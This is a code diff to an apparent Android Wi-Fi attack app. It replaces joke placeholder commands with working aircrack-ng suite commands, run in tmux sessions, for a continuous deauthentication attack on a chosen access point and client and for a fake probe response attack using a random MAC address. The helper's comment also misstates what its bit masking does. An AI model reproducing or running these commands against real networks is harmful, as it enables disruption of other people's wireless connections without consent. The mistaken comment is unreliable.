@@ -17,6 +17,7 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import java.util.ArrayList;
+import java.util.Random;
 
 public class AttackToggle extends AppCompatActivity implements MyCallback {
 
@@ -33,6 +34,26 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
     private SshOperations mBoundService;
 
     Handler handler;
+
+    private String randomMACAddress(){
+        Random rand = new Random();
+        byte[] macAddr = new byte[6];
+        rand.nextBytes(macAddr);
+
+        macAddr[0] = (byte)(macAddr[0] & (byte)254);  //zeroing last 2 bytes to make it unicast and locally adminstrated
+
+        StringBuilder sb = new StringBuilder(18);
+        for(byte b : macAddr){
+
+            if(sb.length() > 0)
+                sb.append(":");
+
+            sb.append(String.format("%02x", b));
+        }
+
+
+        return sb.toString();
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -51,16 +72,16 @@ public class AttackToggle extends AppCompatActivity implements MyCallback {
         String tempStatusToToastEnded = "";
 
         if (attackNumber == 1){
-            tempAttackCommand = "touch watykan";
-            tempEndCommand = "rm watykan";
-            tempStatusToToastStarted = "PIERWSZY ATAK NA WATYKAN PRZEPROWADZONO POMYSLNIE";
-            tempStatusToToastEnded = "PIERWSZY ATAK NA WATYKAN ZAKONCZONO POMYSLNIE";
+            tempAttackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s deAuth 'airmon-ng stop wlan1; airmon-ng start wlan1 "+ device.getChannel() + " && aireplay-ng -0 0 -a " + device.getBssid() + " -c " + device.getMacAddress() + " wlan1'";
+            tempEndCommand = "tmux kill-session -t deAuth; tmux new-session -d -s airodump 'airmon-ng stop wlan1; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
+            tempStatusToToastStarted = "Deauthentication attack launched";
+            tempStatusToToastEnded = "Deauthentication attack terminated";
         }
         else if (attackNumber == 3){
-            tempAttackCommand = "touch watykan";
-            tempEndCommand = "rm watykan";
-            tempStatusToToastStarted = "TRZECI ATAK NA WATYKAN PRZEPROWADZONO POMYSLNIE";
-            tempStatusToToastEnded = "TRZECI ATAK NA WATYKAN ZAKONCZONO POMYSLNIE";
+            tempAttackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s fakeProbe 'airbase-ng -a " + randomMACAddress() + " -d " + device.getMacAddress() + " -v -Z 1 -P -C 0.1 wlan1'";
+            tempEndCommand = "tmux kill-session -t fakeProbe; tmux new-session -d -s airodump 'airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
+            tempStatusToToastStarted = "Fake probe response attack launched";
+            tempStatusToToastEnded = "Fake probe response attack terminated";
         }
 
         final String attackCommand = tempAttackCommand;
